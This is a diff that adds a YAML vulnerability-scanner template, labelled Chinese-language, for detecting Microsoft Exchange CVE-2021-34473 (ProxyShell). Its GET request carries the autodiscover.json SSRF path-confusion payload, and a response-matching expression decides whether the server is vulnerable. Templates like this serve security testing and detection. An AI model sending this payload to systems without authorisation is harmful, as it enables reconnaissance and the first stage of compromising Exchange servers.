@@ -1,0 +1,19 @@
+id: poc-yaml-microsoft-exchange-server-rce
+info:
+  name: Microsoft Exchange Server 远程执行代码漏洞(CVE-2021-34473)
+  severity: critical
+  tags:
+  - 两高一弱
+  - rce
+  - CVE-2021-34473
+  finger: exchange_server
+variables:
+  path: 'autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com
+
+    autodiscover/autodiscover.json?@test.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@test.com'
+requests:
+- method: GET
+  path: /{{.path}}
+  expression: contains(body,"Microsoft.Exchange.Clients.Owa2.Server.Core.OwaADUserNotFoundException")
+    || contains(body,"Exchange MAPI/HTTP Connectivity Endpoint")
+transport: http
